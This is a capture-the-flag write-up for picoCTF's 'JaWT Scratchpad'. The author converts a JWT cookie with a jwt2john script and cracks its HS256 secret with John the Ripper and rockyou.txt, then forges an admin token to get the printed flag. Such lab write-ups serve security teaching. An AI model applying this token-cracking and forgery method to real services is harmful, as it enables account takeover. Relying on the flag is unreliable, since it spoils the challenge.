# JaWT Scratchpad - Points: 400

1. First, lets go through the website : https://2019shell1.picoctf.com/problem/21893/
2. Then, I type "123" to login. 
3. Next, I check my cookie and see : 
    ```
    jwt : 
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMTIzIn0.jgZBxsEy_Mq68jv7XDm-sQr1BUOMHuV8c4dUIxHMT2k
    ```
    So, I google "jwt decode" and I get the result : 
    ```
    header : 
        {
          "typ": "JWT",
          "alg": "HS256"
        }
        
    payload : 
        {
          "user": "123"
        }
    ```
4. Then, I see : 
    ```
    Register with your name!
    You can use your name as a log in, because that's quick and easy to remember! 
    If you don't like your name, use a short and cool one like John!
    ```
    So, I click john and find out it is a tool that can crack password.
5. Next, I google "jwt john the ripper" and here is the website that can help : https://security.stackexchange.com/questions/134200/cracking-a-jwt-signature Here is the python code : 
    ```
    import sys
    from jwt.utils import base64url_decode
    from binascii import hexlify


    def jwt2john(jwt):
        """
        Convert signature from base64 to hex, and separate it from the data by a #
        so that John can parse it.
        """
        jwt_bytes = jwt.encode('ascii')
        parts = jwt_bytes.split(b'.')

        data = parts[0] + b'.' + parts[1]
        signature = hexlify(base64url_decode(parts[2]))

        return (data + b'#' + signature).decode('ascii')


    if __name__ == "__main__":
        if len(sys.argv) != 2:
            print("Usage: %s JWT" % sys.argv[0])
        else:
            john = jwt2john(sys.argv[1])
            print(john)
    ```
    After I use the script, the result is : 
    ```
    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiMTIzIn0#8e0641c6c132fccabaf23bfb5c39beb10af505438c1ee57c7387542311cc4f69
    ```
6. Then I use john the ripper to crack the secret key : 
    ```
    john jwt.john --wordlist=rockyou.txt
    ```
    And the result is : 
    ```
    Using default input encoding: UTF-8
    Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
    Will run 8 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    ilovepico        (?)
    1g 0:00:00:02 DONE (2020-01-03 21:04) 0.3558g/s 2635Kp/s 2635Kc/s 2635KC/s ilovetitoelbambino..ilovejesus71
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed

    ```
    The secret key is "ilovepico"
7. So, we use the website : https://jwt.io/ and change the "user" to "admin" and the secret key to "ilovepico" then refresh the page. 
8. Here is the flag : picoCTF{jawt_was_just_what_you_thought_c84a0d3754338763548dfc2dc171cdd0}
